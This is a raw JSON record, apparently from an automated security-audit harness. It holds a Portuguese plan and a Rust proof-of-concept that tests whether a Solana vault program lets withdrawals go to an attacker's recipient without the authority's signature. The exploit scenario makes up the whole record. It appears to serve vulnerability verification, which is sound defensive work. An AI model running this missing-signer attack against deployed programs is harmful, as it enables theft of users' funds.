attempts.raw:
{
  "plan": "Preparamos um vault com dados contendo a autoridade armazenada (chave publica conhecida) e saldo de 1000 lamports, e uma conta recipient do atacante. O baseline executa withdraw com a autoridade assinando, provando que o cenario esta correto. O ataque repete a mesma instrucao, mas a conta authority nao assina, e o recipient e do atacante. O efeito mede que os lamports do vault diminuem e os do recipient aumentam sem a assinatura da autoridade.",
  "scenario": "let authority = Pubkey::new_unique();
let recipient = Pubkey::new_unique();
let vault_key = Pubkey::new_unique();

let mut vault_data = vec![0u8; 48];
vault_data[8..40].copy_from_slice(authority.as_ref());
vault_data[40..48].copy_from_slice(&1000u64.to_le_bytes());

let vault_account = account(&env.program_id, &vault_data, Some(1000));
let authority_account = wallet(0);
let recipient_account = wallet(0);

let metas = vec![
    AccountMeta::new(vault_key, false),
    AccountMeta::new_readonly(authority, true),
    AccountMeta::new(recipient, false),
];
let mut ix_data = vec![0u8];
ix_data.extend_from_slice(&500u64.to_le_bytes());
let ix = env.raw_ix(&ix_data, metas);

let contas = vec![
    (vault_key, vault_account.clone()),
    (authority, authority_account.clone()),
    (recipient, recipient_account.clone()),
];

let r = env.baseline("withdraw legitimo com autoridade assinando", &ix, &contas);

let vault_after_baseline = after(&r, &vault_key).clone();
let recipient_after_baseline = after(&r, &recipient).clone();

let metas_attack = vec![
    AccountMeta::new(vault_key, false),
    AccountMeta::new_readonly(authority, false),
    AccountMeta::new(recipient, false),
];
let ix_attack = env.raw_ix(&ix_data, metas_attack);

let contas_attack = vec![
    (vault_key, vault_after_baseline),
    (authority, authority_account),
    (recipient, recipient_after_baseline),
];

let r_attack = env.attack("withdraw sem assinatura da autoridade", &ix_attack, &contas_attack);

if r_attack.program_result == ProgramResult::Success {
    let vault_after = after(&r_attack, &vault_key);
    let recipient_after = after(&r_attack, &recipient);
    env.effect("vault perdeu lamports sem assinatura da autoridade", vault_after.lamports() < 1000);
    env.effect("recipient ganhou lamports sem assinatura da autoridade", recipient_after.lamports() > 0);
}"
}

